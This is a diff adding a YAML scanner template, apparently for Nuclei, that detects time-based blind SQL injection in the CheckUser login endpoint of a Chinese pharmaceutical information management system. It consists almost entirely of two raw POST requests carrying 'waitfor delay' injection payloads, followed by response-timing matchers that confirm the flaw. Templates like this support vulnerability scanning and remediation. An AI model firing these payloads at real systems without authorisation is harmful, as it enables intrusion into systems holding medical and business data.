@@ -1,0 +1,38 @@
+id: poc-yaml-qianyiyun-mims-checkuser-sqli
+info:
+  name: 千宜医药信息管理系统 CheckUser SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 千宜医药信息管理系统
+http:
+  - raw:
+      - |
+        POST /Login.aspx/CheckUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        
+        {"value":"' waitfor delay '0:0:5'--+"}
+      - |
+        POST /Login.aspx/CheckUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        
+        {"value":"' waitfor delay '0:0:8'--+"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"d":""}'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
